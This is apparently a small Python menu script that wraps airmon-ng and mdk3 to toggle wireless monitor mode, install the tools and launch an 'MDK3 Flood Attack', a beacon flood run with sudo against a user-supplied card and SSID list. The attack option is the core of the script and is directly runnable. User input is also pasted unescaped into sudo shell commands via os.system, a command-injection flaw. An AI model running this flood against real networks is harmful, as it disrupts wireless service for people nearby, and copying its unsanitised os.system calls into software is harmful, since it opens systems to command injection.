import os

def main():
    os.system("clear")
    print('''\u001b[31;1m
    ╔═════════════════════════════╗
    ║ \u001b[37;1mv!e \u001b[31;1m= \u001b[32;1mEnable Monitor Mode   \u001b[31;1m║           
    ║                             ║
    ║ \u001b[37;1mv!d \u001b[31;1m= \u001b[32;1mDisable Monitor Mode  \u001b[31;1m║
    ║                             ║
    ║ \u001b[37;1mv!f \u001b[31;1m= \u001b[32;1mMDK3 Flood Attack     \u001b[31;1m║
    ║                             ║
    ║ \u001b[37;1mv!u \u001b[31;1m= \u001b[32;1mUpdate Packages       \u001b[31;1m║
    ╚═════════════════════════════╝''')
    shell = input("\u001b[36;1mshell~$ \u001b[37;1m")    
    if shell == "v!e":
        os.system("clear")
        card = input("\u001b[34;1mEnter Network Card: ")
        os.system("sudo airmon-ng start " + card)
        os.system("clear")
        main()

    if shell == "v!d":
        os.system("clear")
        card = input("\u001b[34;1mEnter Network Card: ")
        os.system("sudo airmon-ng stop " + card)
        os.system("clear")
        main()

    if shell == "v!f":
        os.system("clear")
        card = input("\u001b[34;1mEnter Network Card: ")
        ssid = input("\u001b[34;1mEnter SSID List: ")
        print("\u001b[32;1mMDK3 Flood Attack Has Started! (CTRL + C = STOP)")
        os.system("sudo mdk3 " + card + " b -a -v " + ssid + " -s 99999")

    if shell == "v!u":
        os.system("sudo apt install mdk3 && sudo apt install aircrack-ng")
        main()

main()
